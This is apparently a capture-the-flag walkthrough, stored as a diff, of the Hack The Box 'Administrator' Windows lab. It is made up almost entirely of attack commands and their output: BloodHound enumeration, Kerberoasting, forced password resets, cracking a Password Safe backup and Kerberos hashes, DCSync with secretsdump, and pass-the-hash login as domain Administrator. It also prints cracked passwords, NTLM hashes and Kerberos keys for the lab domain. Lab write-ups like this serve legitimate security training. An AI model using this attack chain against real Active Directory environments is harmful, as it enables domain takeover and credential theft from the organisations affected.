@@ -1,0 +1,311 @@
+As is common in real life Windows pentests, you will start the Administrator box with credentials for the following account:
+
+Username: Olivia Password: ichliebedich
+
+
+┌──(kali㉿kali)-[~]
+└─$ bloodhound-python -u Olivia -p 'ichliebedich' -d administrator.htb -ns 10.10.11.42 -c all --zip
+INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
+INFO: Found AD domain: administrator.htb
+INFO: Getting TGT for user
+WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc.administrator.htb:88)] [Errno -2] Name or service not known
+INFO: Connecting to LDAP server: dc.administrator.htb
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 1 computers
+INFO: Connecting to LDAP server: dc.administrator.htb
+INFO: Found 11 users
+INFO: Found 53 groups
+INFO: Found 2 gpos
+INFO: Found 1 ous
+INFO: Found 19 containers
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: dc.administrator.htb
+INFO: Done in 00M 05S
+INFO: Compressing output into 20250820135602_bloodhound.zip
+                                                               
+
+
+┌──(kali㉿kali)-[~]
+└─$ smbclient -L //10.10.11.42 -U 'administrator\Olivia%ichliebedich'
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        NETLOGON        Disk      Logon server share 
+        SYSVOL          Disk      Logon server share 
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 10.10.11.42 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+                                                                                                                   
+┌──(kali㉿kali)-[~]
+└─$ 
+
+we can PS remote in
+
+Olivia has GenericAll over Michael
+
+*Evil-WinRM* PS C:\Users\olivia\Downloads> . ./PowerView.ps1
+*Evil-WinRM* PS C:\Users\olivia\Downloads> $SecPassword = ConvertTo-SecureString 'ichliebedich' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('administrator.htb\Olivia', $SecPassword)
+Set-DomainObject -Credential $Cred -Identity michael -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}
+Get-DomainSPNTicket -Credential $Cred michael | fl
+Cannot validate argument on parameter 'SPN'. The argument "michael" does not match the ".*/.*" pattern. Supply an argument that matches ".*/.*" and try the command again.
+At line:4 char:39
++ Get-DomainSPNTicket -Credential $Cred michael | fl
++                                       ~~~~~~~
+    + CategoryInfo          : InvalidData: (:) [Get-DomainSPNTicket], ParameterBindingValidationException
+    + FullyQualifiedErrorId : ParameterArgumentValidationError,Get-DomainSPNTicket
+*Evil-WinRM* PS C:\Users\olivia\Downloads> Get-DomainSPNTicket -Credential $Cred -SPN 'nonexistent/BLAHBLAH' | fl
+Warning: [Invoke-UserImpersonation] powershell.exe is not currently in a single-threaded apartment state, token impersonation may not work.
+Warning: [Invoke-UserImpersonation] Executing LogonUser() with user: administrator.htb\Olivia
+
+
+SamAccountName       : UNKNOWN
+DistinguishedName    : UNKNOWN
+ServicePrincipalName : nonexistent/BLAHBLAH
+TicketByteHexStream  :
+Hash                 : $krb5tgs$23$*UNKNOWN$UNKNOWN$nonexistent/BLAHBLAH*$7391E8E3AF071B99E942D70A73508CDA$439D5053DA2F5446D464F5BAEB7D5C8FDB68769DCD8A5219361049A6FA62A0C7CBE4B0E73496BBF38466A239673E7F0E5245B844847E6FFA572E1F23165FF479FFB60870790E82
+                       54E9E030FABA9AB38A2F670867D3885E6B7F7592C301D3C5A367577251FBFBAADE70E7947D97DC3477B22FE3B55E739396F3A8120B17F41F8DDD4F7ED8806D02BF530FF31034BEC2E52659FBE65E7DDB4CE2E6F98F80F2717AF4628D99AF84715546E9FEB15AF4A16A9BC68EC67C049BC5
+                       5D5AE7DEE3994FD05B60C15477F89A2E73567E1BA5260B9C3B2BAA486506664EA90F3A47B28AC6A1D999A9F852DD57822B05734FECE452270A76D95036033F8F7076F3BAE0B4EC310F8AAF5B833EC90B9CBFB671610D8AB7D98B40A0597C523BF91A851E78DD587AF1805F48A3FB02F23F
+                       D7351F0455832EAC1AF14F92C3A49821827513587E6E3EF3DBA28F073E2EF4E61F2822FE39D12BAE95554DFB6F184003A0FEB868EB22127F49614E5164FFA3BE7A7BD7BB5D167DFABB827496ED6E02DD54C2F390A2D2D2B6945FFE7BA2A42C7EAD032A10562E680FE81788A8E065C7D77B
+                       2840EDF11F6810240AF472536B09B892E04C07881063C59E4A5AD04463CE01173A0340BDBCE6D2F066A6F01A98ACEF0E0C4B594373B9A986ED44E079003D3F0889A36FC3D80ED94B157C5B0FAC6EA55DBDDDBCC433E321AB48CF1605C525E7F5E42C7EE743FDFF4A5780018CEF07E7F693
+                       082CD0E7BFCE75B96CC43B8934241875B49F016442035BDE5746F2AAF82A368300AFC4823ED03793DA0DC8BAE6797EF2AC9E59B4E66BADF811F6D4E53A1D2D82EADCE0D766B2D03AA4FD069AD2CB24E9C0C64F2CD7B18479023115E40CB0AEEA9BD9EC709DD9006A1EA5836798BAC36397
+                       B95AB9C8AD307311BFC60476543518F8EEBC2050343E3FE581EBE6A992C59801D0B2FD3938FBBFDD9BD03582D2BDBB18443722B85E533B68E80334060EBB7ADEDDC7DAD71A3E0AB3C3EB6EBDEA4E9B523D23942103D599AADF88F808C395D3437193696D348D187A5FD21404CD68F65E6A
+                       101E11D3ED006DBB088BAC746D9655EA010EB062718B0D2C62583D949CF5615B96FDD634D3E3FD5F0F8AF432DD06D812AE7D0C0E54D659F665A3F6B87702B7FA6148274D47FE6C45C689F67AC2B1955513AFD3EC9D20834B65CAF23D7C1CB00E7D61CC7FA6CBAC0724967E2F26EDC636BC
+                       3FA630E1B0A6C1A19315D09777B8F1238DA7B471BD72D6465C00B1BC0BE20BC234911047B31E56AEAA6DE8486D8F40C07EC8914DFA09E1612BA2342C6B95D31F9253D938C3701FD61A8063E84AE4749B0C9EDD948131473B5258779FC7C3F287E9522655B07BDE0D0DAA1CCE788FC17483
+                       B641B432CB847DD100FC42DFE249D7AF21E59ECDBD4B7E5407EAC1EBFF66BFB5C0364A4612D1805633919BDC9748854AD9BD63BCE2B843504F4DA0233F6B51852989FAF3E1445BED44CBF9938B920A6761A7FA3B24AD1998BA26104C2433D2B253B3E693C2CC448D0D97D90695BD4A6113
+                       C26A5259635FA826FF482712BA840D85F344FBB553E50AE977BAAAF81EE63B6FA604663FE6DC18A4C09F845CDBED77B9CF356CD1FE19592EE797DF433B10ECC81CBDD583F882D104302139D5094C02C096C40929FFDC371EF6EFA1431FEA1EA8843235BB6471EDCA00B704A2B3ED393429
+                       FE
+
+Warning: [Invoke-RevertToSelf] Reverting token impersonation and closing LogonUser() token handle
+
+
+*Evil-WinRM* PS C:\Users\olivia\Downloads> 
+
+unable to crack using rockyou.
+
+so we change Password
+
+
+*Evil-WinRM* PS C:\Users\olivia\Downloads> net user michael nirza123 /domain
+The command completed successfully.
+
+*Evil-WinRM* PS C:\Users\olivia\Downloads> 
+
+Michael has ForceChangePassword over Benjamin
+
+┌──(root㉿kali)-[/home/kali]
+└─# net rpc password "Benjamin" "nirza123" -U "ADMINISTRATOR"/"Michael"%"nirza123" -S 10.10.11.42
+                                                                                                                    
+┌──(root㉿kali)-[/home/kali]
+└─# ftp benjamin@10.10.11.42                                                                            
+Connected to 10.10.11.42.
+220 Microsoft FTP Service
+331 Password required
+Password: 
+230 User logged in.
+Remote system type is Windows_NT.
+ftp> dir
+229 Entering Extended Passive Mode (|||63766|)
+150 Opening ASCII mode data connection.
+10-05-24  09:13AM                  952 Backup.psafe3
+226 Transfer complete.
+ftp> get Backup.psafe3
+local: Backup.psafe3 remote: Backup.psafe3
+229 Entering Extended Passive Mode (|||63767|)
+150 Opening ASCII mode data connection.
+100% |***********************************************************************|   952       77.00 KiB/s    00:00 ETA
+226 Transfer complete.
+WARNING! 3 bare linefeeds received in ASCII mode.
+File may not have transferred correctly.
+952 bytes received in 00:00 (74.93 KiB/s)
+ftp> 
+ftp> bye
+221 Goodbye.
+                                                                                                                    
+┌──(root㉿kali)-[/home/kali]
+└─# hashcat -a 0 -m 5200 Backup.psafe3 /usr/share/wordlists/rockyou.txt 
+hashcat (v6.2.6) starting
+
+OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+====================================================================================================================================================
+* Device #1: cpu-penryn-11th Gen Intel(R) Core(TM) i5-1135G7 @ 2.40GHz, 1438/2941 MB (512 MB allocatable), 3MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Zero-Byte
+* Single-Hash
+* Single-Salt
+* Slow-Hash-SIMD-LOOP
+
+ATTENTION! Potfile storage is disabled for this hash mode.
+Passwords cracked during this session will NOT be stored to the potfile.
+Consider using -o to save cracked passwords.
+
+Watchdog: Temperature abort trigger set to 90c
+
+Host memory required for this attack: 0 MB
+
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+
+Backup.psafe3:tekieromucho                                
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 5200 (Password Safe v3)
+Hash.Target......: Backup.psafe3
+Time.Started.....: Sat Aug 23 15:30:55 2025 (1 sec)
+Time.Estimated...: Sat Aug 23 15:30:56 2025 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:     4387 H/s (9.26ms) @ Accel:64 Loops:1024 Thr:1 Vec:4
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 4800/14344385 (0.03%)
+Rejected.........: 0/4800 (0.00%)
+Restore.Point....: 4608/14344385 (0.03%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:2048-2049
+Candidate.Engine.: Device Generator
+Candidates.#1....: Liverpool -> 525252
+Hardware.Mon.#1..: Util: 66%
+
+Started: Sat Aug 23 15:30:27 2025
+Stopped: Sat Aug 23 15:30:58 2025
+                                                                                                                    
+┌──(root㉿kali)-[/home/kali]
+└─# pwsafe Backup.psafe3                
+
+
+
+
+we get these creds
+
+alexander UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
+emily UXLCI5iETUsIBoFVTj8yQFKoHjXmb
+emma WwANQWnmJnGV07WQN8bMS7FMAbjNur
+
+we use netexec to check.
+netexec smb 10.10.11.42 -u user.txt -p pass.txt
+only emily's creds are valid.
+
+┌──(root㉿kali)-[/home/kali]
+└─# evil-winrm -i 10.10.11.42 -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\emily\Documents> 
+
+
+Emily has GenericWrite over Ethan
+
+┌──(root㉿kali)-[/home/kali]
+└─# python3 targetedKerberoast.py --dc-ip 10.10.11.42 -d administrator.htb -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' -U ethan.txt          
+[*] Starting kerberoast attacks
+[*] Fetching usernames from file
+[+] Printing hash for (ethan)
+$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$b430f899eeaa23be50dd34974bccf9b7$88381ec0888f3511c5cf12a430baf917fa92321a5d6f4371b00ed95365b27420b9cd652d497992c3beee9634ff883d284f6368f9d10c6dca6bca7800cccb36a944c7c7c4fbf34f963e30cedb59da2e7f9442db21391ab3d0bc6369868b976a7a7855ef48dd1bfa9ad03c5918b014aa262ac222d6846be303e03f9db3a4299276697da864bd758f53f31a89aa5b8c53c2eddfb948d76efed6c79c2f8f9202ec781f365dc36cda3626a3eb224e83f468463b27b22357de77226885a8b80402b7646203571b594e3b8a9744fe66fd31652ca852dcae13de0e9b6a0639acf0395c4abad6122bbefba23e9ad8f1ba9953ba34f2a1c5f52e0618030c1bf135a8e41a03aee413d2e97c96a82b3f7e2d2da5dd60c522c76006c7bb8cb4bf5fb8cec93b7969268adf204097d056efa612b0b8b4bb487ae56ba9a582b1a32fac1ec4e7815ac75f6d54b51f54703be9f16d48a853ea3c8fd87c29b417137d223e01fdb413ebd5b1c49e77035b5412e13248a25ca2b74df2452db256baf88f78bf96104e365f79182af6590f63978b15693e1175572205baad6ead4574331dad954db5d5885cc0ef9feec3efb3f0f5421fc95c743b3e0539b18577c877c7b11bcc85f8a63bb69362054b4d366728545e66ad944e715d5d21dbdb85b16928e9474ccdb4444b9fa71c85228191d681f7034286fc2c1d5b5604277edc2f77572899171779c2ffdf138828a75a723aa95e9659f43073efff9b9fff83e48eea74b903f395cde4e12306cd88006bbd1e1ddded94fd7c3cd132fc35d44b588dffa9aaedc0519a6f4b0db4d9060cdaaf8773da6d5cc83cc41f216fdb11a42a7004237a6593db284bad2fbeb768f805e1fe3581c1d9b39f5460ceb33e0d4d97338bf391990cf6eb3b9dede93597fd46a2b57fc29e128790b84a74f86e8e15f2a056f6576cf6fb8d8558a077cb538ef03dd9b552f094f392c68653db716b4da20e91135941ac4326506a1c3626e85e0ffc6fc52de245348408fbacc87bee591537bf6b19ac656b5274e9f1c90387e9d8d3d5b8689a9bd357794003633c935ad5ae00b2593e2f031f8ebdbb51daefc4dab8bbe36aa8e1f3a004c188590c7c0d53eb65830a0fe5e9ab15e65860b2069315dab9e34bc472dd05f56e93a52bf670637cf02fce035b6c86d6a815124b4a282363b0bcef8abf60cb24abc4ce38cb12b73cc6e696604f99ca74fd7c81fd610a22f5b3117112f25deabad7efd8e9d1f0bbc04db1b0255fbd962e4a4a7ca8e4a5db77b0d7c8c1cb4cd77620d3feba166cb3d26d9c47e6aa1ae187134d8131b1c0f59ff109f81125bc000e58cfc1e53311f51260996b8361e18bef57359474a3144f671e75d0619e49cc3228b29c35853378a91afe58fc801dae59246da1883ae4b58e1992ba710b4b2c86e10d591402b28528b9ec53f6a7fa156357917cd713f708f9643acf73f924d8397d1bc06f5c6d4dead6e3b2c99c3aef69b7b6a7b8c23255418c74dc03c5ce88d7cc490c198de91c9ffb1d8ded4fc5e1b56d
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
+Will run 3 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+limpbizkit       (?)     
+1g 0:00:00:00 DONE (2025-08-23 15:44) 33.33g/s 179200p/s 179200c/s 179200C/s Liverpool..ginuwine
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+                                                                                                                     
+Ethan has DCSync privileges
+
+┌──(root㉿kali)-[/home/kali]
+└─# impacket-secretsdump administrator.htb/ethan:limpbizkit@10.10.11.42 -just-dc                            
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6:::
+administrator.htb\olivia:1108:aad3b435b51404eeaad3b435b51404ee:fbaa3e2294376dc0f5aeb6b41ffa52b7:::
+administrator.htb\michael:1109:aad3b435b51404eeaad3b435b51404ee:41320fdff1d6c9b55c939c77a472a8a4:::
+administrator.htb\benjamin:1110:aad3b435b51404eeaad3b435b51404ee:41320fdff1d6c9b55c939c77a472a8a4:::
+administrator.htb\emily:1112:aad3b435b51404eeaad3b435b51404ee:eb200a2583a88ace2983ee5caa520f31:::
+administrator.htb\ethan:1113:aad3b435b51404eeaad3b435b51404ee:5c2b9f97e0620c3d307de85a93179884:::
+administrator.htb\alexander:3601:aad3b435b51404eeaad3b435b51404ee:cdc9e5f3b0631aa3600e0bfec00a0199:::
+administrator.htb\emma:3602:aad3b435b51404eeaad3b435b51404ee:11ecd72c969a57c34c819b41b54455c9:::
+DC$:1000:aad3b435b51404eeaad3b435b51404ee:cf411ddad4807b5b4a275d31caa1d4b3:::
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:9d453509ca9b7bec02ea8c2161d2d340fd94bf30cc7e52cb94853a04e9e69664
+Administrator:aes128-cts-hmac-sha1-96:08b0633a8dd5f1d6cbea29014caea5a2
+Administrator:des-cbc-md5:403286f7cdf18385
+krbtgt:aes256-cts-hmac-sha1-96:920ce354811a517c703a217ddca0175411d4a3c0880c359b2fdc1a494fb13648
+krbtgt:aes128-cts-hmac-sha1-96:aadb89e07c87bcaf9c540940fab4af94
+krbtgt:des-cbc-md5:2c0bc7d0250dbfc7
+administrator.htb\olivia:aes256-cts-hmac-sha1-96:713f215fa5cc408ee5ba000e178f9d8ac220d68d294b077cb03aecc5f4c4e4f3
+administrator.htb\olivia:aes128-cts-hmac-sha1-96:3d15ec169119d785a0ca2997f5d2aa48
+administrator.htb\olivia:des-cbc-md5:bc2a4a7929c198e9
+administrator.htb\michael:aes256-cts-hmac-sha1-96:62704309784898effd2f1ba8ec90b86aa22147af21cc222b99209d15f8da8aac
+administrator.htb\michael:aes128-cts-hmac-sha1-96:04e9e7f743890501d38a1a1460bc0ac1
+administrator.htb\michael:des-cbc-md5:8a9870dafdab4cd0
+administrator.htb\benjamin:aes256-cts-hmac-sha1-96:62313ac6d2aee1a63717ac4911f6d12c11754d36dd1ec8fef395583dfb7ca7a0
+administrator.htb\benjamin:aes128-cts-hmac-sha1-96:2754dd252f548687bd201283e7a371c0
+administrator.htb\benjamin:des-cbc-md5:b3b61913abb3abb9
+administrator.htb\emily:aes256-cts-hmac-sha1-96:53063129cd0e59d79b83025fbb4cf89b975a961f996c26cdedc8c6991e92b7c4
+administrator.htb\emily:aes128-cts-hmac-sha1-96:fb2a594e5ff3a289fac7a27bbb328218
+administrator.htb\emily:des-cbc-md5:804343fb6e0dbc51
+administrator.htb\ethan:aes256-cts-hmac-sha1-96:e8577755add681a799a8f9fbcddecc4c3a3296329512bdae2454b6641bd3270f
+administrator.htb\ethan:aes128-cts-hmac-sha1-96:e67d5744a884d8b137040d9ec3c6b49f
+administrator.htb\ethan:des-cbc-md5:58387aef9d6754fb
+administrator.htb\alexander:aes256-cts-hmac-sha1-96:b78d0aa466f36903311913f9caa7ef9cff55a2d9f450325b2fb390fbebdb50b6
+administrator.htb\alexander:aes128-cts-hmac-sha1-96:ac291386e48626f32ecfb87871cdeade
+administrator.htb\alexander:des-cbc-md5:49ba9dcb6d07d0bf
+administrator.htb\emma:aes256-cts-hmac-sha1-96:951a211a757b8ea8f566e5f3a7b42122727d014cb13777c7784a7d605a89ff82
+administrator.htb\emma:aes128-cts-hmac-sha1-96:aa24ed627234fb9c520240ceef84cd5e
+administrator.htb\emma:des-cbc-md5:3249fba89813ef5d
+DC$:aes256-cts-hmac-sha1-96:98ef91c128122134296e67e713b233697cd313ae864b1f26ac1b8bc4ec1b4ccb
+DC$:aes128-cts-hmac-sha1-96:7068a4761df2f6c760ad9018c8bd206d
+DC$:des-cbc-md5:f483547c4325492a
+[*] Cleaning up... 
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# evil-winrm -i 10.10.11.42 -u Administrator -H'3dc553ce4b9fd20bd016e098d2d2fd2e'
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> 
+
+
+
+
+
+
+
+
+
+
+
